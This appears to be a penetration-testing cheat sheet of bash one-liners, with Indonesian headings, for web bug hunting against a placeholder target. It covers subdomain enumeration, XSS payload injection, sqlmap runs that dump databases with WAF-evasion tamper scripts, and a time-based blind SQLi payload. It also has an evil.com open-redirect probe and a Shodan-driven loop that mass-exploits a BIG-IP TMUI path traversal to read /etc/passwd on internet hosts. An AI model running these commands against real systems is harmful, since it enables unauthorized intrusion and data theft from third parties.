### Enumerasi
```bash
# Subdomain enumeration using subfinder and amass
subfinder -dL /home/kali/Tools/Target.txt -o subfinder.txt
amass enum -passive -norecursive -noalts -df /home/kali/Tools/Target.txt -o amass.txt

# Nmap scanning with specified ports and scripts
nmap -Pn -A -sV -sC (IPTarget) -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

# Finding subdomains with sublist3r
sublist3r -d https://target.com/ -o sublist3r.txt
```

### XSS (Cross-Site Scripting)
```bash
# XSS detection using dalfox
dalfox file /home/kali/Tools/Target.txt -b https://hahwul.xss.ht -o Vulnerable_XSS.txt

# XSS payloads using waybackurls and curl
waybackurls https://Target.com/ | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"; done

# Finding reflected XSS with Gxss
cat /home/kali/Tools/Target.txt | Gxss -p khXSS -o XSS_Ref.txt
```

### SQL Injection (SQLi)
```bash
# SQLi detection using sqlmap
sqlmap -u https://Target.com/ --dbs --forms --crawl=2
sqlmap -g /home/kali/Tools/Target.txt --dbs --forms --crawl=2
sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump

# Automated SQLi payloads and detection with sqlmap
subfinder -dL /home/kali/Tools/Target.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

waymore -i $domain -mode U -oU ./waymoreUrls.txt -url-filename -p 4
echo $domain | (gauplus || hakrawler) | grep -Ev "\.(jpeg|jpg|png|ico|woff|svg|css|ico|woff|ttf)$" > ./gaukrawler.txt
cat ./waymoreUrls.txt ./gaukrawler.txt | sort -u | uro | gf endpoints > allUrls.txt


# Blind SQLi time-based payloads
cat /home/kali/Tools/Target.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt
```

### CORS Misconfiguration
```bash
# CORS scanning using CORS-Scanner and corscanner
python3 corsy.py -i /home/kali/Tools/Target.txt
cat /home/kali/Tools/Target.txt | CORS-Scanner
corscanner -i /home/kali/Tools/Target.txt -v -t 100
```

### Specific Vulnerability Scanning using Nuclei
```bash
# Scanning for specific vulnerabilities using Nuclei templates
nuclei -u https://Target.com -w nuclei-templates/cloud/aws/aws-code-env.yaml
nuclei -list /home/kali/Tools/Target.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml

# WordPress workflow
nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml

# Exposures in Symfony configuration
nuclei -list /home/kali/Tools/Target.txt -w nuclei-templates/http/exposures/configs/symfony-profiler.yaml
```

### Parameter Discovery
```bash
# Parameter discovery using Arjun
arjun -u https://Target.com/login -w burp-parameter-names.txt
arjun -u https://Target.com/login -w /home/kali/SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

### HTTP Probing and Waybackurls
```bash
# Extract URLs and probe HTTP
cat /home/kali/Tools/Target.txt | waybackurls | grep "?" | uro | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
cat /home/kali/Tools/Target.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @

# Using gau and hakrawler for URL discovery
echo https://Target.com | hakrawler > testphp.txt && cat testphp.txt | grep -o "http[^ ]*" > testphp_filter_urls.txt && cat testphp_filter_urls.txt | grep = > testphp_parameter_urls.txt
```

### Miscellaneous
```bash
# Using httpx for status code checking
httpx -l /home/kali/Tools/Target.txt -path "///evil.com" -status-code -mc 302

# Shodan for reconnaissance
shodan search http.favicon.hash:-1252041730 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done

# Running various python scripts for specific vulnerabilities
python2 pwnredir.py -u https://Target.com -f payloads.list
python3 pwnxss.py -u https://Target.com
python3 pwnssrf.py -H https://Target.com
python3 dotdotslash.py -u https://Target.com
```
